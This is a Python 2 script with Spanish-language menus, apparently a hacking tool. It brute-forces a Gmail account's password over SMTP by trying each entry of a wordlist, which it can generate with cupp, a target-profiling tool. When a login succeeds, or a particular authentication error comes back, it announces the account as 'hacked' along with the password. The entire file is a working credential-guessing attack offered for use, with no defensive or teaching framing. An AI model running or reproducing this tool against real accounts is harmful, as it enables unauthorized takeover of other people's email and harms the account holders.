#!/usr/bin/python
'''# coding = utf-8'''
'''creado por AXThct'''
import smtplib
from os import system
import os

def main():
   print '================================================='
   print '               creado por AXThct                  '
   print '================================================='
   print '                                                 '
   print '\n                                               '
   print ' =====                                                  '
   print ' |%   ||     &?>>>    % ***>  %&   &%  &   $ 01010101      &?>>>      '
   print ' |%   //    &?        0   /   # & & #  %   #    01        &?     '
   print ' |%==//    &?==>>    & ==O    #  %  #  $   &    10       &?==>>     ' 
   print ' |%       &?        %  \      #     #  $   &    11      &?     '
   print ' |%      &?#==>>   %$   \     #     #  \&#&/    00     &?#==>>     \n' 
   print ' ______________________________________________________________________'
   print ' ______________________________________________________________________'
main()
print '[1] Iniciar'
print '[2] Crear Diccionario Basico'
print '[3] Crear Diccionario Avanzado(cupp)'
print '[4] Salir'
option = input('>')
if option == 1:
   file_path = raw_input('Direccion del diccionario (txt) :')
elif option == 2:
   os.system("python3 diccionariogen.py -h")
   os.system("python3 diccionariogen.py")
   file_path = raw_input('Direccion del diccionario (txt) :')
   '''exit() ''' 
elif option == 3:
   os.system("python3 cupp.py -i")
   '''exec(open("cupp.py").read())'''
   file_path = raw_input('Direccion del diccionario (txt) :')
else:
   system('clear')
   exit()
pass_file = open(file_path,'r')
pass_list = pass_file.readlines()
def login():
    i = 0
    user_name = raw_input('Correo Electronico :')
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.ehlo()
    for password in pass_list:
      i = i + 1
      print str(i) + '/' + str(len(pass_list))
      try:
         server.login(user_name, password)
         system('clear')
         main()
         print '\n'
         print '[+] La cuanta a sido hackeada con :' + password
         break
      except smtplib.SMTPAuthenticationError as e:
         error = str(e)
         if error[14] == '<':
            system('clear')
            main()
            print '[+] La cuanta a sido hackeada con :' + password 

            break
         else:
            print '[!] Contrasena Invalida => ' + password
login()
